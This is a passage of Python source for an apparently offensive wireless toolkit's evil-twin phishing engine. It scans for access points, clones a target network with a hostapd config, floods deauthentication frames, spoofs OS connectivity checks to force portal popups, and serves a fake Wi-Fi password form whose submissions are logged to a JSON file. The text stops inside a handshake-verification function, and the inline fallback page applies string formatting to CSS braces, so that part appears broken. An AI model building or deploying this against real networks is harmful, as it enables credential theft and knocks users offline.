#!/usr/bin/env python3
# Author: Andre Henrique (@mrhenrike) | Uniao Geek
"""Native evil twin and captive portal engine.

Incorporates the best patterns from wifiphisher and fluxion as native
Python code. Orchestrates the full evil twin workflow:
  1. Scan for target APs (Scapy Beacon/ProbeResponse sniff)
  2. Clone AP via dynamically generated hostapd config (accepted dep)
  3. Continuous deauthentication via flood_engine_native.send_deauth
  4. DNS redirect via dns_dhcp_server.CaptiveDNSServer (dnslib)
  5. DHCP via dns_dhcp_server.CaptiveDHCPServer (Scapy BOOTP)
  6. HTTP captive portal serving existing templates from resources/captive_templates/
  7. OS connectivity check responses to force native captive portal popups
  8. Credential capture to JSON file
  9. Optional handshake verification before dismissing portal (Fluxion pattern)

All deauth uses flood_engine_native.send_deauth (lazy import).
All DNS/DHCP uses dns_dhcp_server module (lazy import).
Templates: reuse existing wirelessxpl/resources/captive_templates/*.html

OS requirement: Linux only (hostapd, raw sockets, monitor mode).

Version: 1.0.0
"""


import http.server
import json
import logging
import os
import shutil
import socketserver
import subprocess
import threading
import time
import urllib.parse
from typing import Any, Dict, List, Optional, Tuple

from wirelessxpl.core.exploit import *
from wirelessxpl.core.os_guard import OSRequirement, requires_os
from wirelessxpl.modules.generic.wifi._disclaimer import require_authorised_lab

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Template directory
# ---------------------------------------------------------------------------

_TEMPLATE_DIR = os.path.normpath(
    os.path.join(os.path.dirname(__file__), "..", "..", "..", "resources", "captive_templates")
)

# ---------------------------------------------------------------------------
# OS connectivity check endpoints and their expected responses.
# Returning the correct status/body for each endpoint triggers the OS native
# captive portal popup on Apple, Android, and Windows devices.
# ---------------------------------------------------------------------------

CONNECTIVITY_CHECKS: dict[str, tuple[int, str]] = {
    "/hotspot-detect.html": (
        200,
        "<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>",
    ),
    "/success.html": (
        200,
        "<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>",
    ),
    "/generate_204": (204, ""),
    "/connecttest.txt": (200, "Microsoft Connect Test"),
    "/redirect": (302, ""),
    "/ncsi.txt": (200, "Microsoft NCSI"),
    "/canonical.html": (200, ""),
    "/library/test/success.html": (
        200,
        "<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>",
    ),
}


# ---------------------------------------------------------------------------
# Internal credential store
# ---------------------------------------------------------------------------


class _CredentialStore:
    """Thread-safe in-memory and on-disk credential storage."""

    def __init__(self, output_file: str) -> None:
        """Initialize storage.

        Args:
            output_file: Path to the JSON file where credentials are appended.
        """
        self._output_file = output_file
        self._lock = threading.Lock()
        self._entries: list[dict[str, Any]] = []
        os.makedirs(os.path.dirname(os.path.abspath(output_file)), exist_ok=True)

    def add(self, data: dict[str, Any]) -> None:
        """Record a credential entry and persist it to disk.

        Args:
            data: Dict of field names to values captured from the POST body.
        """
        data = {k: str(v)[:512] for k, v in data.items()}
        data["timestamp"] = time.strftime("%Y-%m-%dT%H:%M:%S")
        with self._lock:
            self._entries.append(data)
            try:
                with open(self._output_file, "w", encoding="utf-8") as fh:
                    json.dump(self._entries, fh, indent=2, ensure_ascii=False)
            except OSError as exc:
                logger.error("Credential write failed: %s", exc)

    @property
    def count(self) -> int:
        """Return the number of credential sets captured."""
        with self._lock:
            return len(self._entries)

    @property
    def all(self) -> list[dict[str, Any]]:
        """Return a snapshot of all captured credential dicts."""
        with self._lock:
            return list(self._entries)


# ---------------------------------------------------------------------------
# Exploit class
# ---------------------------------------------------------------------------


@requires_os(OSRequirement.LINUX_ONLY)
class Exploit(Exploit):
    """Evil twin captive portal engine with native DNS/DHCP and deauth."""

    __info__ = {
        "name": "Phishing Engine",
        "description": (
            "Full evil twin and captive portal engine using pure-Python DNS/DHCP "
            "(no dnsmasq), Scapy deauthentication flood, and a built-in HTTP "
            "portal server. Incorporates patterns from wifiphisher and fluxion: "
            "target AP scanning, hostapd AP clone, continuous deauth, OS "
            "connectivity check spoofing, credential capture to JSON, and "
            "optional WPA handshake verification before dismissing the portal."
        ),
        "authors": ("Andre Henrique (@mrhenrike) | Uniao Geek",),
        "references": (
            "https://www.wifiphisher.org/",
            "https://github.com/FluxionNetwork/fluxion",
        ),
        "devices": ("wifi", "802.11"),
    }

    mode = OptString("info", "Mode: info, scan, list_templates, start")
    interface_ap = OptString("wlan1", "Interface for the rogue AP (AP/master mode)")
    interface_mon = OptString("wlan0mon", "Monitor interface for deauth flood")
    bssid = OptString("", "BSSID of the target AP (required for start mode)")
    ssid = OptString("", "SSID for the rogue AP (auto-detected if empty)")
    channel = OptInteger(6, "Channel of the target AP")
    template = OptString("router_admin", "Captive portal template name")
    output_file = OptString(".tmp/phishing_credentials.json", "JSON file for captured credentials")
    deauth_continuous = OptBool(True, "Run continuous deauth flood against target AP")
    verify_handshake = OptBool(False, "Verify password against captured handshake (Fluxion pattern)")
    handshake_file = OptString("", "WPA handshake file (.hc22000) for verification")
    portal_ip = OptString("10.0.0.1", "IP address assigned to the rogue AP interface")
    scan_duration = OptFloat(15.0, "AP scan duration in seconds")
    i_know_scope = OptBool(False, "Confirm authorized lab environment")

    # ------------------------------------------------------------------
    # AP scanning
    # ------------------------------------------------------------------

    def scan_aps(self, iface: str, duration: float = 15.0) -> list[dict[str, Any]]:
        """Sniff 802.11 Beacon and ProbeResponse frames to discover APs.

        Requires the interface to be in monitor mode and Scapy to be
        installed. Returns results sorted by signal strength descending.

        Args:
            iface: Monitor-mode wireless interface name.
            duration: Sniff duration in seconds.

        Returns:
            List of dicts with keys: bssid, ssid, channel, signal, encryption.

        Raises:
            ImportError: If Scapy is not installed.
        """
        try:
            from scapy.all import (  # type: ignore[import-untyped]
                Dot11,
                Dot11Beacon,
                Dot11Elt,
                Dot11ProbeResp,
                RadioTap,
                sniff,
            )
        except ImportError as exc:
            raise ImportError(
                "Scapy is required for AP scanning. Install: pip install scapy"
            ) from exc

        seen: dict[str, dict[str, Any]] = {}

        def _process(pkt: Any) -> None:
            has_beacon = pkt.haslayer(Dot11Beacon)
            has_probe = pkt.haslayer(Dot11ProbeResp)
            if not (has_beacon or has_probe):
                return

            dot11 = pkt.getlayer(Dot11)
            if not dot11:
                return

            bssid = str(dot11.addr3 or "").lower()
            if not bssid or bssid == "ff:ff:ff:ff:ff:ff":
                return

            ssid = ""
            channel = 0
            encryption = "open"

            elt = pkt.getlayer(Dot11Elt)
            while elt is not None:
                try:
                    if elt.ID == 0:
                        ssid = (elt.info or b"").decode("utf-8", errors="replace")
                    elif elt.ID == 3 and elt.info:
                        channel = int.from_bytes(bytes(elt.info[:1]), "big")
                    elif elt.ID == 48:
                        encryption = "WPA2"
                    elif elt.ID == 221 and len(elt.info) >= 4:
                        if bytes(elt.info[:4]) == b"\x00\x50\xf2\x01" and encryption == "open":
                            encryption = "WPA"
                except Exception:
                    pass
                try:
                    elt = elt.payload.getlayer(Dot11Elt)
                except Exception:
                    break

            # Privacy capability bit -> WEP if no WPA/WPA2 IE found
            if encryption == "open" and has_beacon:
                try:
                    cap = pkt[Dot11Beacon].cap
                    if cap & 0x10:
                        encryption = "WEP"
                except Exception:
                    pass

            signal = 0
            if pkt.haslayer(RadioTap):
                try:
                    signal = getattr(pkt.getlayer(RadioTap), "dBm_AntSignal", 0) or 0
                except Exception:
                    signal = 0

            seen[bssid] = {
                "bssid": bssid,
                "ssid": ssid,
                "channel": channel,
                "signal": int(signal),
                "encryption": encryption,
            }

        sniff(iface=iface, prn=_process, timeout=duration, store=False)

        return sorted(seen.values(), key=lambda x: x.get("signal", -100), reverse=True)

    # ------------------------------------------------------------------
    # hostapd configuration
    # ------------------------------------------------------------------

    def generate_hostapd_conf(
        self,
        bssid: str,
        ssid: str,
        channel: int,
        iface: str,
    ) -> str:
        """Generate a hostapd configuration string for the rogue AP.

        Creates an open (no encryption) network that clones the target
        SSID and channel. The BSSID line is included only when the
        hardware permits MAC address override.

        Args:
            bssid: BSSID of the target AP (used for the bssid= directive).
            ssid: SSID to broadcast (should match the target AP).
            channel: 802.11 channel number.
            iface: AP interface name (must support nl80211 master mode).

        Returns:
            hostapd configuration file content as a string.
        """
        lines = [
            f"interface={iface}",
            "driver=nl80211",
            f"ssid={ssid}",
            "hw_mode=g" if channel <= 13 else "hw_mode=a",
            f"channel={channel}",
            "wmm_enabled=0",
            "macaddr_acl=0",
            "auth_algs=1",
            "ignore_broadcast_ssid=0",
        ]
        if bssid and bssid.lower() not in ("", "ff:ff:ff:ff:ff:ff"):
            lines.append(f"bssid={bssid.lower()}")
        return "\n".join(lines) + "\n"

    def start_hostapd(self, conf_path: str) -> subprocess.Popen:
        """Launch hostapd with the given configuration file.

        Args:
            conf_path: Absolute or relative path to the hostapd config.

        Returns:
            Running subprocess.Popen instance for the hostapd process.

        Raises:
            FileNotFoundError: If hostapd is not on the system PATH.
        """
        hostapd_bin = shutil.which("hostapd")
        if not hostapd_bin:
            raise FileNotFoundError(
                "hostapd not found. Install with: apt install hostapd"
            )
        proc = subprocess.Popen(
            [hostapd_bin, conf_path],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        logger.info("hostapd started (pid=%d) with config %s", proc.pid, conf_path)
        return proc

    # ------------------------------------------------------------------
    # Template listing
    # ------------------------------------------------------------------

    def list_templates(self) -> list[str]:
        """Return names of available captive portal templates.

        Scans resources/captive_templates/ for:
          - Subdirectories containing an index.html file
          - Direct .html files (newer format)

        Returns:
            Sorted list of template name strings.
        """
        if not os.path.isdir(_TEMPLATE_DIR):
            return []
        found = []
        for entry in os.scandir(_TEMPLATE_DIR):
            if entry.is_dir() and os.path.isfile(os.path.join(entry.path, "index.html")):
                found.append(entry.name)
            elif entry.is_file() and entry.name.endswith(".html"):
                # Direct .html template (strip extension for name)
                found.append(entry.name[:-5])
        return sorted(set(found))

    def _load_template_html(self, template_name: str, ssid: str) -> str:
        """Load portal HTML from template directory or .html file, with fallback.

        Supports two template formats:
          - Directory: captive_templates/<name>/index.html
          - File:      captive_templates/<name>.html

        Args:
            template_name: Template name (directory or file stem).
            ssid: SSID inserted into the inline fallback template.

        Returns:
            HTML string for the captive portal page.
        """
        # Try directory format first
        tpl_path = os.path.join(_TEMPLATE_DIR, template_name, "index.html")
        if os.path.isfile(tpl_path):
            try:
                with open(tpl_path, encoding="utf-8") as fh:
                    return fh.read()
            except OSError as exc:
                logger.warning("Could not read template %s: %s", tpl_path, exc)

        # Try direct .html file format
        tpl_path_html = os.path.join(_TEMPLATE_DIR, template_name + ".html")
        if os.path.isfile(tpl_path_html):
            try:
                with open(tpl_path_html, encoding="utf-8") as fh:
                    return fh.read()
            except OSError as exc:
                logger.warning("Could not read template %s: %s", tpl_path_html, exc)

        # Inline minimal fallback
        return (
            "<!DOCTYPE html>"
            "<html lang=\"en\"><head>"
            "<meta charset=\"utf-8\">"
            "<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">"
            "<title>Wi-Fi Authentication Required</title>"
            "<style>"
            "*{margin:0;padding:0;box-sizing:border-box}"
            "body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;"
            "background:#f5f5f5;display:flex;align-items:center;"
            "justify-content:center;min-height:100vh}"
            ".card{background:#fff;border-radius:12px;"
            "box-shadow:0 4px 24px rgba(0,0,0,.1);padding:2.5rem;max-width:400px;width:90%}"
            "h1{font-size:1.25rem;color:#333;margin-bottom:.5rem;text-align:center}"
            "p{color:#666;font-size:.9rem;margin-bottom:1.5rem;text-align:center}"
            "label{display:block;font-size:.85rem;color:#555;margin-bottom:.25rem}"
            "input{width:100%;padding:.75rem;border:1px solid #ddd;border-radius:8px;"
            "font-size:1rem;margin-bottom:1rem}"
            "button{width:100%;padding:.85rem;background:#007bff;color:#fff;"
            "border:none;border-radius:8px;font-size:1rem;cursor:pointer}"
            "button:hover{background:#0056b3}"
            "</style></head><body>"
            "<div class=\"card\">"
            "<h1>Connect to {}</h1>"
            "<p>Enter the network password to continue.</p>"
            "<form method=\"POST\" action=\"/capture\">"
            "<label for=\"password\">Wi-Fi Password</label>"
            "<input type=\"password\" id=\"password\" name=\"password\" "
            "placeholder=\"Enter password\" required minlength=\"8\" maxlength=\"63\">"
            "<button type=\"submit\">Connect</button>"
            "</form></div></body></html>"
        ).format(ssid)

    # ------------------------------------------------------------------
    # Portal HTTP server
    # ------------------------------------------------------------------

    def capture_credentials(self, body: str) -> dict[str, str]:
        """Parse and sanitize POST body into a credential dict.

        Args:
            body: URL-encoded POST body string from the HTTP request.

        Returns:
            Dict of field names to values, each truncated to 512 chars,
            with null bytes removed.
        """
        raw = urllib.parse.parse_qs(body, keep_blank_values=False)
        creds: dict[str, str] = {}
        for key, values in raw.items():
            safe_key = str(key).replace("\x00", "")[:64]
            safe_val = str(values[0] if values else "").replace("\x00", "")[:512]
            creds[safe_key] = safe_val
        return creds

    def _verify_password_against_handshake(
        self,
        password: str,
        handshake_file: str,
    ) -> bool:
